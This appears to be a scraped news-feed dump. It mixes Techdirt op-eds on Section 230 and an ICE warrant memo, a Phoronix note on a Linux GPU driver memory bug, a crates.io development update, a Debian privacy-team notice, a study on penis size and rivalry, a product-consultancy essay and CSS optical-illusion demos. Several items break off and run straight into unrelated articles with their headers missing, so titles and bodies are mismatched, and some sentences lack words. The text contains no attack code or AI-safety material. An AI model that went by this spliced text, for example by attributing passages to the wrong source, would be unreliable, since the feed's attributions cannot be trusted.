Worked.</title><link>https://www.techdirt.com/2026/01/22/section-230-didnt-fail-rand-paul-he-just-doesnt-like-the-remedy-that-worked/</link><author>Ashkhen Kazaryan</author><category>tech</category><pubDate>Thu, 22 Jan 2026 20:34:45 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Rand Paul is furious. That’s because someone posted a video falsely accusing the Kentucky senator of taking money from Venezuela’s Maduro regime.Paul should know that the First Amendment sets a deliberately high bar for defamation of public officials like him. Under , he must show not just falsity, but that the speaker knew it was false or had serious doubts about the validity and published it anyway That demanding standard known as “actual malice” exists for a reason — to ensure that fear of lawsuits does not silence criticism of those who hold power, even when the speech is offensive, wrong, or deeply unfair.Instead of fighting this battle in court against the person who created this video, Paul has redirected his anger toward Section 230, the law often described as the 26 words that created the modern Internet. Although he once defended the law’s provisions that shield online platforms from liability for user speech, Paul now argues in a recent  op-ed that the only solution is to tear it down. At the heart of Paul’s argument is a simple demand: YouTube should have stepped in, judged the accusation against him to be false, and removed it. Once notified that the video was false, the platform should have been legally responsible for leaving it up. Section 230, he argues, prevents that from happening. But who decides what is false? Who decides what is defamatory? And how quickly must those judgments be made — under threat of crushing lawsuits — by platforms hosting speech from millions of users around the world?It’s surprising to see Senator Paul, who’s been vocal against government jawboning of speech, pledge to pursue legislation that would amend the law because a private platform failed to moderate speech the way he wanted.Paul insists this distinction is hypocritical because platforms removed his COVID-era statements they deemed as false while leaving up a lie about him. This argument collapses under its own weight. The Supreme Court has repeatedlyheld that private companies can make editorial decisions. They are allowed to be inconsistent, mistaken, biased, or wrong. As the Court affirmed in “it is no job for government to decide what counts as the right balance of private expression—to ‘un-bias’ what it thinks biased [ . . . ] That principle works for social-media platforms as it does for others.” In other words, the First Amendment protects editorial discretion precisely because the government cannot be trusted with it.If Section 230 protections are rolled back, the consequences could be profound. Some platforms will over-moderate to avoid legal exposure, removing lawful but controversial content. Others will under moderate, allowing harmful content to spread unchecked since any moderation decision could open them up to liability. Such a shift will not harm the powerful but the vulnerable, the dissenters, and the voices that depend on intermediaries to be heard. Smaller platforms and start-ups may shut down,  avoid hosting speech, or change their business models altogether due to litigation risk.Paul draws a comparison between platforms and newspapers, arguing that publishers historically avoided defamation through editorial judgment. But newspapers choose what they print before publication. Platforms host speech created entirely by others, at unimaginable scale. The t is still protected by Section 230 from being liable for the comment section on its online articles.The real, speech-protective answer is defamation law. If Paul believes that a video contains lies about him, he could sue the creator for defamation and prove actual malice under the  standard. But we cannot and should not dismantle the legal foundation of online speech because it failed to protect one powerful man. That sets a precedent that will harm millions of marginalized voices. Ashkhen Kazaryan is a Senior Legal Fellow at The Future of Free Speech, a nonpartisan think tank at Vanderbilt University.]]></content:encoded></item><item><title>Linux GPU Driver Loophole Being Fixed For Unprivileged Users Being Able To Tap Unbounded Kernel Memory</title><link>https://www.phoronix.com/news/Linux-DRM-Blob-OOM</link><author>Michael Larabel</author><category>tech</category><pubDate>Thu, 22 Jan 2026 20:25:00 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[An oversight in the Linux kernel's Direct Rendering Manager (DRM) graphics driver common code could allow unprivileged users to trigger unbounded kernel memory consumption for a potential system-wide out-of-memory "OOM" situation...]]></content:encoded></item><item><title>crates.io development update | Rust Blog - A new &quot;Security&quot; tab, migration to Svelte for the front-end, support for GitLab CI/CD Trusted Publishing, Lines of Code metrics</title><link>https://blog.rust-lang.org/2026/01/21/crates-io-development-update/</link><author>/u/nik-rev</author><category>rust</category><category>reddit</category><pubDate>Thu, 22 Jan 2026 20:24:54 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[Time flies! Six months have passed since our last crates.io development update, so it's time for another one. Here's a summary of the most notable changes and improvements made to crates.io over the past six months.Crate pages now have a new "Security" tab that displays security advisories from the RustSec database. This allows you to quickly see if a crate has known vulnerabilities before adding it as a dependency.The tab shows known vulnerabilities for the crate along with the affected version ranges.This feature is still a work in progress, and we plan to add more functionality in the future. We would like to thank the OpenSSF (Open Source Security Foundation) for funding this work and Dirkjan Ochtman for implementing it.
Trusted Publishing EnhancementsIn our July 2025 update, we announced Trusted Publishing support for GitHub Actions. Since then, we have made several enhancements to this feature.Trusted Publishing now supports GitLab CI/CD in addition to GitHub Actions. This allows GitLab users to publish crates without managing API tokens, using the same OIDC-based authentication flow.Note that this currently only works with GitLab.com. Self-hosted GitLab instances are not supported yet. The crates.io implementation has been refactored to support multiple CI providers, so adding support for other platforms like Codeberg/Forgejo in the future should be straightforward. Contributions are welcome!
Trusted Publishing Only ModeCrate owners can now enforce Trusted Publishing for their crates. When enabled in the crate settings, traditional API token-based publishing is disabled, and only Trusted Publishing can be used to publish new versions. This reduces the risk of unauthorized publishes from leaked API tokens.The  and  GitHub Actions triggers are now blocked from Trusted Publishing. These triggers have been responsible for multiple security incidents in the GitHub Actions ecosystem and are not worth the risk.Crate pages now display source lines of code (SLOC) metrics, giving you insight into the size of a crate before adding it as a dependency. This metric is calculated in a background job after publishing using the tokei crate. It is also shown on OpenGraph images:
Publication Time in IndexA new  field has been added to crate index entries, recording when each version was published. This enables several use cases:Cargo can implement cooldown periods for new versions in the futureCargo can replay dependency resolution as if it were a past date, though yanked versions remain yankedServices like Renovate can determine release dates without additional API requests
Svelte Frontend MigrationAt the end of 2025, the crates.io team evaluated several options for modernizing our frontend and decided to experiment with porting the website to Svelte. The goal is to create a one-to-one port of the existing functionality before adding new features.This migration is still considered experimental and is a work in progress. Using a more mainstream framework should make it easier for new contributors to work on the frontend. The new Svelte frontend uses TypeScript and generates type-safe API client code from our OpenAPI description, so types flow from the Rust backend to the TypeScript frontend automatically.Thanks to eth3lbert for the helpful reviews and guidance on Svelte best practices. We'll share more details in a future update.These were some of the more visible changes to crates.io over the past six months, but a lot has happened "under the hood" as well.Cargo user agent filtering: We noticed that download graphs were showing a constant background level of downloads even for unpopular crates due to bots, scrapers, and mirrors. Download counts are now filtered to only include requests from Cargo, providing more accurate statistics.: Emails from crates.io now support HTML formatting.: OAuth access tokens from GitHub are now encrypted at rest in the database. While we have no evidence of any abuse, we decided to improve our security posture. The tokens were never included in the daily database dump, and the old unencrypted column has been removed.: Crate pages now display a "Browse source" link in the sidebar that points to the corresponding docs.rs page. Thanks to Carol Nichols for implementing this feature.: The sparse index at index.crates.io is now served primarily via Fastly to conserve our AWS credits for other use cases. In the past month, static.crates.io served approximately 1.6 PB across 11 billion requests, while index.crates.io served approximately 740 TB across 19 billion requests. A big thank you to Fastly for providing free CDN services through their Fast Forward program!OpenGraph image improvements: We fixed emoji and CJK character rendering in OpenGraph images, which was caused by missing fonts on our server.Background worker performance: Database indexes were optimized to improve background job processing performance.CloudFront invalidation improvements: Invalidation requests are now batched to avoid hitting AWS rate limits when publishing large workspaces.We hope you enjoyed this update on the development of crates.io. If you have any feedback or questions, please let us know on Zulip or GitHub. We are always happy to hear from you and are looking forward to your feedback!]]></content:encoded></item><item><title>Since Last May, ICE Officers Have Been Told They Don’t Need Warrants To Enter Homes</title><link>https://www.techdirt.com/2026/01/22/since-last-may-ice-officers-have-been-told-they-dont-need-warrants-to-enter-homes/</link><author>Tim Cushing</author><category>tech</category><pubDate>Thu, 22 Jan 2026 20:11:00 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[The thing afforded the highest protections of the Fourth Amendment is a person’s home. This isn’t even a controversial statement. It has been that way ever since this amendment was ratified.But, under Trump, we’re constantly seeing that the administration considers all rights to be privileges — something only granted to people this administration likes. The Associated Press has obtained a blockbuster leak — one that shows ICE officers have been told that they’re free to enter homes without a judicial warrant. Instead, they can just write themselves an  warrant and then just go about their business of terrorizing a nation. ICE carries around things they call warrants, but hardly resemble the real thing. An administrative warrant is self-issuing. The officer who wants to use it only needs to fill in a few blanks and sign it before heading out to try to arrest the person listed on the paperwork. There’s no signature line for supervisors, which means these aren’t reviewed by anyone else but the person writing them.But since last May, ICE officers have been instructed they can treat these pieces of paper like  warrants — you know, the ones that are subjected to at least a cursory review by a judge. The whistleblower report [PDF] contains screenshots of the memo issued by ICE head Todd Lyons, last seen here complaining repeatedly about people who complain about ICE officers acting like paramilitary kidnapping squads. What’s contained in that memo is batshit insane. First of all, it’s the DHS telling itself that it’s okay to ignore the Fourth Amendment.Although the U.S. Department of Homeland Security (DHS) has not historically relied on administrative warrants alone to arrest aliens subject to final orders of removal in their place of residence, the DHS Office of the General Counsel  that the U.S. Constitution, the Immigration and Nationality Act, and the immigration regulations do not prohibit relying on administrative warrants for this purpose. There’s a very good reason the DHS has “not historically relied” on administrative warrants to enter people’s homes in search of arrestable migrants. That reason would be the US Constitution, which only “recently” fell out of favor with the GOP ruling class. According to Lyons and the completely compromised DHS Office of the Legal Counsel, the only thing needed to engage in what is  a warrantless entry is a final order of removal. A couple of paragraphs later, the memo states explicitly what ICE officers are authorized to do under the power of this memo (which  isn’t what they’re authorized to do under the Constitution):Should the alien refuse admittance, ICE officers and agents should use only a necessary and reasonable amount of force to enter the alien’s residence…You can write a memo and issue it and claim the in-house lawyers said it was all cool and legal, but that still doesn’t make it cool and legal. All it does is add another layer of “good faith” to ICE officers’ violations of the Fourth Amendment. After all, if they were told they could do this, how could they be expected to know it was actually illegal? A footnote follows that, which makes it clear ICE officers will engage in warrantless entries even if they  actually obtained a final order of removal.This scoping is not intended to concede that an administrative warrant would be insufficient to arrest an alien in his or her place of residence prior to a final order of removal or where there is a final order of removal issued by an immigration officer. In other words, ICE officers can enter any alleged migrant’s house without a warrant at pretty much any time, so long as they’re carrying their self-issued non-warrants (the Form I-205 referenced throughout the memo). This directly contradicts ERO (Enforcement and Removal Operations) training for ICE officers, which is included in the leaked documents the AP obtained. That training spells it out succinctly and explicitly (caps in the original): An administrative arrest warrant does NOT alone authorize a 4th Amendment search of any kind. That’s no longer the case, apparently. It’s not like this training has been rescinded. It seemingly remains on the books because it creates even more plausible deniability for officers being sued. And ICE director Todd Lyons (along with his OLC enablers) know the contents of this memo can’t possibly be legal. That’s why this memo has never been officially added to ERO training or otherwise officially made part of the ICE operations manual. If Lyons and other top immigration enforcement officials actually thought this shit would hold in court, they wouldn’t have done this: While addressed to “All ICE Personnel,” in practice the May 12 Memo has not been formally distributed to all personnel. Instead, the May 12 Memo has been provided to select DHS officials who are then directed to verbally brief the new policy for action. Those supervisors then show the Memo to some employees, like our clients, and direct them to read the Memo and return it to the supervisor.In the case of the whistleblower who gave this to the Associated Press, they were instructed to read it and return it. They were not allowed to take notes. They were also informed that another employee had been reassigned for questioning ICE policies, which was taken by the whistleblower as the overt threat it is. This is fucking insane. A federal government agency has decided the Fourth Amendment no longer exists and has done everything it can from keeping this clearly unconstitutional policy change from spreading beyond those who’ve already bought into the DHS’s new direction as the expression of the GOP’s white nationalist goals. And it’s a problem that’s only going to get exponentially worse as ICE frantically on-boards new hires, who are given plenty of cash, but nearly nonexistent training before being sent out to fulfill the racist desires of people like White House advisor Stephen Miller. What little they may know (or care) about constitutional rights is being eroded even further by official memos that claim it’s perfectly legal to do something that clearly — under the DHS’s own published training — violates the Fourth Amendment.Without a doubt, the administration will shrug this off and/or tell people they shouldn’t believe things they’ve seen with their own eyes. For now, we can only hope this might knock a few Republicans out of the MAGA loop, even if it’s only the ones who realize they definitely wouldn’t want to turn this unearned expansion of power over to an administration not run by one of their own. ]]></content:encoded></item><item><title>The era of the Small Giant (Interview)</title><link>https://changelog.com/podcast/673</link><author></author><category>podcast</category><enclosure url="https://op3.dev/e/https://cdn.changelog.com/uploads/podcast/673/the-changelog-673.mp3" length="" type=""/><pubDate>Thu, 22 Jan 2026 20:00:00 +0000</pubDate><source url="https://changelog.com/podcast">Podcast - Changelog</source><content:encoded><![CDATA[Damien Tanner (founder of Pusher, now building Layercode) is back for a reunion 17 years in the making.

Its role has been to act as a point of contact for external inquiries about what personal data the project holds and to advise Debian contributors on data protection obligations.Additionally, the team was also responsible for drafting Debian’s public privacy policy and coordinating responses to data access and privacy-related requests.Coincidence or not, all three team members have now resigned simultaneously. So, Tille formally revoked their delegation and thanked them for their work over the past years. With their departure, the team currently has no active members.“The fact that all team members have stepped back at the same time shouldmake it clear that we urgently need new volunteers to fulfil this role.”According to the message, despite a constructive discussion on the topic during the most recent DebConf, no new volunteers came forward. As a result, the Debian Project Leader is temporarily handling all data protection inquiries, adding to an already heavy workload.So, Debian is now calling on contributors with an interest in privacy and data protection to step in. Potential volunteers would be expected to help maintain and improve the existing privacy policy and to work with Debian teams that process personal data, improving workflows for handling data protection requests.The project has stressed that restoring a functioning Data Protection Team is urgent, both to meet legal obligations and to ensure that privacy-related inquiries are handled in a timely and sustainable manner.]]></content:encoded></item><item><title>How do you handle orphaned ConfigMaps and Secrets without breaking prod?</title><link>https://www.reddit.com/r/kubernetes/comments/1qk4yxq/how_do_you_handle_orphaned_configmaps_and_secrets/</link><author>/u/Important-Night9624</author><category>reddit</category><pubDate>Thu, 22 Jan 2026 19:58:13 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I'm doing some spring cleaning on our clusters and seeing tons of ConfigMaps and Secrets that look unused, but I'm paranoid about deleting them.You know the deal- teams refactor, Helm releases get abandoned, but the old configs stick around because  doesn't prune them automatically.

The study authors hope their results will help inform future health research and more nuanced health guidance.For example, the researchers suggest guidelines should recognize the difference between passively watching TV and actively using a computer, and encourage people to take short breaks to stimulate their brains and move.Their review focused on studies of typical sedentary activities in natural settings, rather than structured programs designed to boost brain function, making it relevant to people's everyday lives."Health advice could shift from simply saying 'sit less' to encouraging more mentally engaging activities while sitting," argues Gardiner."This could help people make easy, realistic changes that support long‑term brain health and potentially reduce dementia risk."]]></content:encoded></item><item><title>Scientists Got Men to Rate Penises by How Intimidating They Are.

When it comes to the evolution of the human penis, size matters. Scientists have discovered that men with larger penises are not only more attractive to women, they are also deemed more threatening to men, which is “the first experimental evidence that males assess rivals’ fighting ability and attractiveness to females based partly on a rival’s penis size,” according to a study published in PLOS Biology on Thursday. “In humans, height and body shape are well known to influence attractiveness, but penis size has rarely been tested alongside these traits in a controlled, experimental setup,” said Upama Aich, a behavioral and evolutionary biologist at the University of Western Australia who led the study, in an email to 404 Media. “What motivated us was the evolutionary puzzle that the human penis is unusually large relative to other primates, which raises the question of whether it signals information beyond its primary reproductive role of sperm transfer,” she added.Sexual selection, a form of natural selection, is a process in which certain traits that enhance reproductive success—from big antlers to colorful feathers—become amplified in a lineage over time. Male traits may persist both because they are selected by females, which is known as intersexual selection, or because those traits are associated with better success against male rivals, which is called intrasexual selection.Previous research  that bigger penises are more attractive to women, in tandem with characteristics like height and body shape, suggesting that intersexual selection may have played a role in the anomalously large human penis. Aich and her colleagues set out to confirm that result, while also testing out the role of intrasexual selection for the first time.The researchers recruited more than 600 male and 200 female participants to rate computer-generated male figures with different heights, body shapes, and penis sizes (all shown in a flaccid state). Some participants attended an in-person display of life-size images while others rated the figures on an online platform. Men were asked to assess the figures as potential rivals, while women were asked to rate them as potential mates. Participants also filled out a questionnaire about their physical characteristics (including height and weight) and sexuality. Given the focus on mates and rivals, the researchers only used responses from self-identified heterosexual males and females in the study. The team designed the approach with nondescript figures devoid of any personality or identifiable background in part to sidestep the immense cultural weight of the human penis, an anatomical feature endowed with major significance across eras and societies. “We were very conscious that penis size is culturally loaded and surrounded by myths, humour, and anxiety,” said Aich. “That’s one reason we used anatomically accurate, computer-generated figures: it allowed us to manipulate specific traits independently while controlling for personal identity, social narratives and contextual cues.” “I do think this cultural baggage has discouraged careful scientific study in sensitive topics in the past, but from an evolutionary perspective, that makes it even more important to examine the question empirically rather than relying on assumptions,” she added.To that end, the new study confirmed that women generally preferred figures with larger penises in addition to taller figures with more V-shaped bodies. It also revealed for the first time that men factored penis size into their assessment of male rivals, as they rated the figures with larger penises as more threatening rivals. Even more importantly, the men overwhelmingly guessed that the figures with larger penises would be more attractive to women. According to the researchers, this hints that in our evolutionary past, males may have avoided confrontations with rivals based in part on their penis size in addition to height and body shape. As a consequence, males with larger penises may have secured more access to mates not only due to female preference, but also because they were not challenged by rivals as often. This aspect of male-male competition may have helped to enlarge the human penis over time through selection.“Previous research had often focused on the effect of penis size on female preferences, so our results that men also use penis size when assessing rivals adds a new dimension to the story,” Aich said. “It suggests penis size is interpreted not only in a sexual context, but also in competitive rival cues.” “However, the effect of penis size on attractiveness was four to seven times higher than its effect as a signal of fighting ability,” she continued. “This suggests that the enlarged penis in humans may have evolved more in response to its effect as a sexual ornament to attract females than as a badge of status for males, although it does both.”Aich said her team was most surprised by the consistency of the participants’ responses across many manipulated variables. Similar patterns in the responses showed up regardless of whether the participants were viewing life-sized projections or scaled images online, whether they received payment for the experiment, and across both male and female participants.“One obvious next step is to study how these visual cues interact with others that matter in real-world interactions, such as facial features, voice, or movement,” she said. “Another open question is how culturally variable these perceptions are, since standards of masculinity and attractiveness differ across societies. A cross-cultural study would be interesting.”The new study adds to the evidence that both forms of sex selection influenced the size of the human penis, but many other factors also played a role in the development of the organ. For example, penis shape and size may have evolved to scoop the sperm of rival males out of the vaginal canal, or to raise the odds of female orgasm, both of which can contribute to reproductive success. In other words, both the size of the ship and the motion of the ocean are a part of the complex story of human sexual evolution. , our newsletter about the most exciting and mind-boggling science news and studies of the week. ]]></content:encoded></item><item><title>WW2 Historian James Holland Explains Why The Nazis Were Doomed</title><link>https://www.youtube.com/watch?v=NUnEOoQtgzI</link><author>History Hit</author><category>yt</category><enclosure url="https://www.youtube.com/v/NUnEOoQtgzI?version=3" length="" type=""/><pubDate>Thu, 22 Jan 2026 19:00:00 +0000</pubDate><source url="https://www.youtube.com/channel/UCZwU2G-KVl-P-O-B35chZOQ">History Hit</source><content:encoded><![CDATA[What really tipped the scales in the Allies’ favour during World War II?

So when we describe ourselves as a 'product transformation consultancy,' what we're really saying is: we can help you transform your digital products, services, and platforms (and organisation). But you'll probably agree, that's a bit of a mouthful.While it's deliberate (in the sense that we apply product-thinking to products, platforms, and services) it also creates confusion, which isn’t helpful when trying to affect change in an organisation – particularly when adopting the Product Operating Model.We regularly see organisations trapped in debates over these definitions, or worse, making critical structural decisions based on unclear distinctions.Often, these problems manifest themselves as:Products that aren't actually products (they're projects in disguise)Product teams subservient to service ownership, stripped of empowermentInternal platforms neglected or treated as cost centresBoundaries drawn too narrow, creating constant coordination overheadBoundaries drawn too wide, overloading teams beyond their cognitive capacityProducts designed in isolation, devoid of service contextWhile it's important to start with clear definitions, the definitions themselves are only half the battle.This article sets out how we characterise products, platforms, and services, how to draw boundaries between them, and makes the case for treating each of them ‘as-a-product’.We're going to start with services, as these sit at the top of the product topology.A (digital) service is software responsible for helping end-users achieve one specific, high-level outcome, typically through a linear user journey. For example: learning to drive, applying for a mortgage, or switching energy suppliers.Service boundaries are defined by what the user is trying to accomplish, not by what the organisation builds. 'Open a bank account' is a service. 'Account Management' is not – that's a product or platform that enables the service. Services are verbs, not nouns. This distinction shifts the frame of reference: where products and platforms are organisational constructs (ways of carving up ownership and capability), services are user constructs – the lens through which users experience what you've built.You'll find services most commonly in service-oriented organisations like the public sector, or in organisations with complex product portfolios looking to optimise high-friction, infrequent transactions, such as financial services and utilities.Services can be internal or external. External services help customers or citizens achieve an outcome like applying for a mortgage or learning to drive. Internal services help employees achieve an outcome. E.g. Onboarding a new starter, submitting expenses, or requesting IT equipment.Services tend to be composed of multiple products and platforms. For example, an 'Apply for a mortgage' service might touch the banking app (product), identity verification (product), credit checking (platform), and document management (platform). The service is the thread that connects them, and can be viewed as an orchestration layer sitting above individual products and platforms.Ownership is typically less clear than with products or platforms. It can be shared or, at worst, ambiguous or non-existent. This is a feature of how services work – they cross boundaries – but it's also a source of problems when nobody owns the end-to-end experience.Services can be nested. A digital 'Learn to drive' service might encompass 'Apply for provisional licence,' 'Book theory test,' and 'Book practical test.' The outer service is the full user journey and the inner services are discrete steps with their own completion states. They're all services because they're all framed around user outcomes.They also frequently incorporate non-digital touchpoints and processes, as well as digital. Used car buying sites like Cazoo and cinch are services. They help people buy used cars. While their ecommerce product is the primary digital touchpoint, there are a myriad of teams, systems, and processes involved, from the company acquiring the vehicle to it being delivered to its new owner and beyond.Oriented around one specific, high-level user outcomeBoundaries defined by user goals, not organisational structureTypically linear, high-friction, infrequent journeysComposed of multiple products and platformsOwnership is often shared, distributed, or ambiguousOften include non-digital touchpoints and processesA (digital) product is software that delivers value to end-users through a defined interface. Users interact with it directly and would recognise it as a thing. If services are verbs, products are nouns. 'Banking App' is a product. 'Open a bank account' is not – that's a service the product enables.Unlike services, which orient around a single user outcome, products typically serve multiple, lower-level user goals through more frequent, routine interactions. Someone opens their banking app to check their balance, make a payment, or report a lost card. Different goals, same product. They can also be internal or external – their end-users might be within the organisation (like an intranet or internal tooling) or external (like a SaaS provider offering accounting software to small business owners).Product boundaries are typically shaped by what the organisation can coherently own and maintain – but that doesn't mean those boundaries are necessarily optimal. Effective boundaries are informed by users' mental models and natural domain boundaries. Because of this, products typically have clearer ownership than services.Products can be nested. A news app like the BBC or Guardian is a product. Within it, the Puzzles section might be considered its own product, owned by a distinct team with its own strategy, roadmap, and even its own revenue model (subscriptions, in the case of NYT Games). Products might also encompass everything a user touches (like a banking app) or a coherent subset of their experience (like Card Management).A single product might also contribute to multiple services – the banking app plays a role in 'Open an account,' 'Apply for a mortgage,' and 'Report fraud.' Where services exist in an organisation, they sit at the top of the topology, products sit beneath them, and platforms – serving both. The main distinction between a product and a platform isn't scope; it's whether the owning team controls the user experience. If your team provides APIs that another team uses to build their screens and flows, it’s a platform, not a product.Delivers value to end-users through a defined interfaceServes multiple user goals through routine interactionsCan be internal or externalBoundaries shaped by what the organisation can coherently ownCan be nested following domain boundariesThe primary purpose of platforms is to reduce cognitive load on the teams that consume them. Rather than every product team figuring out identity, payments, or infrastructure from scratch, a platform encapsulates that complexity and exposes it through well-designed APIs, tools, and documentation. A good platform makes the right thing the easiest thing to do.Where products are nouns that users recognise, platforms are the infrastructure beneath them. If your team provides APIs, components, or services that another team uses to build their user experience, you're running a platform.Platforms are typically internal – serving teams within your organisation. A design system, an identity service, a data platform. When a capability is productised for external developers with a designed interface and developer experience, it becomes a product whose users happen to be developers. Stripe isn't a platform; it's a product for developers.Platform boundaries are shaped by technical capability and domain, not user journeys. A platform typically encapsulates a coherent technical capability (e.g. payments, identity, notifications, search) that multiple products or services need. This is where Domain-Driven Design's concept of bounded contexts becomes particularly useful: a well-defined platform has clear interfaces and doesn't leak its internal complexity to consumers.Platforms sit beneath products and services in the topology. An 'Apply for a mortgage' service might depend on a credit checking platform. A banking app (product) might depend on a payments platform. The platform doesn't own the user experience; it enables the teams that do.Like products and services, platforms can be nested. A large organisation might have a data platform that contains sub-platforms: a data warehouse, a streaming platform, an analytics platform. Each can be owned by a distinct team with its own roadmap. Platforms can also have products built on top – a platform team might own both the APIs (the platform) and a developer portal (a product whose users are developers).Provides capabilities consumed by other teams, not end-users directlyPrimary purpose is reducing cognitive load on consuming teamsBoundaries shaped by technical capability and domainClear, single-team ownershipCan be nested following technical domain boundariesMay have products built on top (e.g., developer portals, admin consoles)Or, if you need a short-hand:Everything ‘as-a-product’The previous sections define what products, platforms, and services are. This section is about how to manage them well.Treating something 'as-a-product' means applying product management discipline to it – whether it's technically a product, platform, or service – and treating it with the same rigour you'd apply to customer-facing products.Why does this matter? Because platforms and services often lack the intentional management that products receive. Platforms get treated as shared infrastructure – cost centres to be minimised rather than capabilities to be invested in. Services get fragmented across teams, with nobody accountable for the end-to-end experience.Clear, empowered ownershipEvery product, platform, and service needs clear ownership – a person or team accountable for its success. For products, this is usually obvious. For platforms and services, it's often missing.Platform ownership frequently defaults to 'shared' or 'the infrastructure team,' which in practice means nobody is accountable for the developer experience, adoption, or evolution. Service ownership is often even worse – because services cross product boundaries, they often have no owner at all, or ownership is distributed across multiple teams who each optimise their slice while the overall journey suffers.Empowerment is also critical. In service-oriented organisations, there's a risk that service owners become de facto product managers – dictating features to product teams who become delivery functions rather than empowered problem-solvers. This strips product teams of the autonomy they need to discover good solutions.Clear ownership doesn't mean one person does everything. It means one person or team is accountable for outcomes, even when delivery involves others.Products have users – this is obvious. But platforms and services have users too, and treating them as such changes how you manage them.For platforms, your users are the teams that consume your APIs and tools. For services, your users are the people trying to achieve an outcome – but because services span multiple products, it's easy to lose sight of them.Proximity means more than knowing who your users are. It means understanding their needs, building empathy for their problems, and actively involving them in discovery. The best teams maintain regular, direct contact with the people they serve – not mediated through layers of research reports or stakeholder proxies."What gets measured gets improved" – Peter Drucker.For products, this typically means end-user metrics: acquisition, activation, retention,  engagement, satisfaction, task completion. For platforms, it means measuring the success of the teams you enable: Are they shipping faster? Are they adopting your platform voluntarily? Are they satisfied with the developer experience? For services, it means measuring the end-to-end outcome: Are users achieving their goal? Where are they dropping off? How long does the journey take?The mistake is measuring activity rather than outcomes. Platforms that measure 'number of API calls' rather than 'time for a new team to onboard' are optimising for the wrong thing. Services that measure 'transactions processed' rather than 'users who successfully completed their goal' are missing the point.Long-lived, cross-functional teamsProducts benefit from continuity – teams that understand the domain, the users, and the codebase. The same applies to platforms and services.This is where project thinking does the most damage. Projects assemble teams, deliver something, then disband. The 'product' enters maintenance mode. Knowledge walks out the door. There's no investment in improvement, no iteration based on what users actually need.Product thinking assumes the work is never 'done.' Teams are long-lived. Funding is continuous. Success is measured by outcomes over time, not delivery against a specification. If your 'product' has a delivery date after which the team moves on, you're running a project – and you'll get project outcomes, not product outcomes.Those teams should also be cross-functional – combining product, design, and engineering (and other skills as needed) in a single team with shared accountability. Cross-functional teams can move faster, make better decisions, and own problems end-to-end without constant handoffs and dependencies.For products and services, strategy connects user needs, organisation goals, and competitive positioning. For platforms, the users are internal teams, the market is your internal ecosystem, and the competitive landscape might be build-vs-buy.Whether it’s a broader portfolio strategy your product, platform, or service is aligning to, or whether it has its own, the strategy should define a long term vision, a framework for making reinforcing decisions, and a coherent set of actions – usually in the form of a roadmap – for achieving it.Room to iterate and improveProduct teams don't just build – they discover, ship, learn, and improve. Platform and service teams should too.This requires space for both continuous discovery and continuous delivery. Discovery means regularly testing assumptions, validating ideas with users, and learning what works before committing to build. Delivery means shipping, measuring, and refining based on what you learn.Platforms often fall into a 'build and maintain' mindset – the platform exists, teams use it, and the platform team's job is to keep it running. This misses the opportunity to improve developer experience, simplify interface, and evolve with changing needs.Services suffer from a similar problem. Once the journey is 'working,' attention shifts elsewhere. But user needs change, friction points emerge, and competitors improve. Services need ongoing investment, not just maintenance.Products, platforms, and services have distinct characteristics – but all benefit from being treated ‘as-a-product’.Services are oriented around user outcomes. Products are organised around what the organisation can coherently own and maintain. Platforms enable product and service teams to move fast without reinventing solutions to common problems.Understanding these distinctions gives you a shared vocabulary. But what separates successful products, platforms, and services from neglected infrastructure and doomed projects is how they're designed and managed:Clear, empowered ownershipClose proximity to end-usersLong-lived, cross-functional teamsRoom to iterate and improveSo, as we said at the start: everything is a product.]]></content:encoded></item><item><title>Pro Tip: Want to see a bug fixed or feature implemented in an open source program?

  1 - Poggendorff Illusions
The Poggendorff illusion is an optical illusion in which a diagonal line interrupted by a vertical bar appears misaligned, even when both segments are actually continuous.A simple version of this effect can be seen in the following demo. I used the  and  pseudo-elements to create the diagonal line and the vertical bar, respectively.The effect can also be seen in a more elaborate version with multiple diagonal lines and vertical bars:This drawing can easily be achieved using two CSS gradients: one tilted at 70 degrees and another consisting of a series of vertical columns. I applied it to the , although I could have used  instead.Another variation of this illusion is the Münsterberg Poggendorff Arch, in which the two sides of an arch appear misaligned and seem as though they will not meet at the top - but they do (mouse over to see it).The following illusions combine gradients and flat colors. Surprisingly, some of the gradients do not actually exist. They are simple gray bars that, when placed over a gradient, appear to have gradients themselves.Take the following demo: all three bars (two vertical ones on the sides and one horizontal bar in the center) are the same shade of gray. The only real gradient is behind them, which tricks our brain into believing that the bars are different colors and even contain gradients.Here is another variation of this effect. It looks like the central line has a repeating gradient of dark and light grays, but in reality it is a flat color. If you mouse over the demo, the bar will expand, making it clear that there is no gradient at all.The next few optical illusions share a common idea: some colors are identical, but they do not look the same. This typically happens when regions of the same color or brightness are surrounded by areas with different contrast.For example, in the following demo, the left and right ends are the same shade of gray. However, one looks lighter because it is closer to white, while the other looks darker because it is closer to black. Mouse over to reveal that they are, in fact, the same color.Run the following demo. You will see two gray columns in a black-and-white grid. Both columns are the same shade of gray, but the one surrounded by black appears darker than the one surrounded by white.I coded this demo using  so I could try something a bit different. That worked well, but it also made it harder to showcase the effect on hover. In hindsight, I should have planned that better.This optical illusion also works with colors. For example, these two squares appear to be different shades of blue, but they are the same color. This time, you can mouse over to reveal the effect:
  5 - Wertheimer-Koffka Ring
The ring in the following illustration has the same color all the way around. However, one side is placed over white and the other over black, which makes them look different. If you mouse over the demo, the red bar will disappear, making it more obvious that the ring is a single, uniform color.You have probably seen the illusion involving a checkerboard and an object casting a shadow, where two tiles - one seemingly light and one seemingly dark - turn out to be the same color.This demo follows the same principle. You will see two tiles labeled A and B. Both have the same shade of gray, but most people cannot tell at first glance (or second, or even third).
  7 - Asahi illusion of Brightness
